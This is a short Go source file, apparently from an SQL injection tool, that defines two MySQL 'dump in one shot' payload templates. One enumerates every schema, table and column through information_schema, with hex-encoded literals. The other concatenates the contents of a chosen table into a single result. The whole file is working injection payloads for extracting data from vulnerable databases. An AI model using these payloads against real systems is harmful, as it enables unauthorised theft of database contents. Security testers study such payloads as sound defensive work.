package mysql

var U_DIOS = map[string]string {
	"get_schema": "(select (@a) from (select(@a:=0x00),(select (@a) from (information_schema.columns) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and(0x00)in (@a:=concat(@a,0x%s,table_schema,0x%s,table_name,0x%s,column_name,0x%s))))a)",
	"dump": "(select (@a) from (select(@a:=0x00),(select (@a) from (%s.%s) where(0x00)in (@a:=concat(@a,0x%s,%s,0x%s))))a)",
}